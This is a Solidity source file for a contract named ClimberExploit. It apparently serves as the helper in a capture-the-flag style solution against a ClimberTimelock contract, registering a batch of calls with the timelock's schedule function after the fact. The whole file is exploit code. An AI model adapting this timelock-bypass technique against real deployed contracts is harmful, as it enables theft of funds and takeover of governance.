pragma solidity 0.8.12;

import {ClimberTimelock} from "./ClimberTimelock.sol";

contract ClimberExploit {
    ClimberTimelock immutable climberTimelock;
    address[] targets;
    bytes[] dataElements;
    bytes32 salt;

    constructor(address _climberTimelock) {
        climberTimelock = ClimberTimelock(payable(_climberTimelock));
    }

    function propose() external {
        uint256[] memory values = new uint256[](targets.length);
        climberTimelock.schedule(targets, values, dataElements, salt);
    }

    function setCalldata(
        address[] memory _targets, // couldn't use calldata due to nested array issue in solidity
        bytes[] memory _dataElements,
        bytes32 _salt
    ) external {
        targets = _targets;
        dataElements = _dataElements;
        salt = _salt;
    }
}
